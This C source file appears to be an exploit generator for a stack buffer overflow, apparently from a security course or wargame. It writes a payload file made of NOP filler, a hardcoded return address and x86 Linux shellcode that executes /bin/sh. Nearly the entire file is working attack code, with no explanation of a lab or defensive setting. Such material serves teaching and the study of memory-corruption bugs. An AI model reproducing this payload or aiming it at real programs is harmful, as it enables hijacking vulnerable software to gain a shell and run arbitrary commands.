#include <stdio.h>
#include <string.h>

#define FILENAME "shellcode"
#define BUF_SIZE 64 + 16

char shellcode[] = 
{
	"\x80\xf6\xff\xbf" // return address
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"
	"/bin/sh"
};
char filler = '\x90';

int main()
{
	FILE *fp = fopen(FILENAME, "w");
	char buf[BUF_SIZE];

	printf("sh-sz=%d fill-sz=%d\n", sizeof(shellcode), BUF_SIZE);	
	if(fp)
	{
		memset(buf, filler, BUF_SIZE);
		fwrite(buf, BUF_SIZE, 1, fp);
		fwrite(shellcode, sizeof(shellcode) - 1, 1, fp);
		fclose(fp);
	}
	else
	{
		printf("could not open file\n");	
	}

	return 0;
}
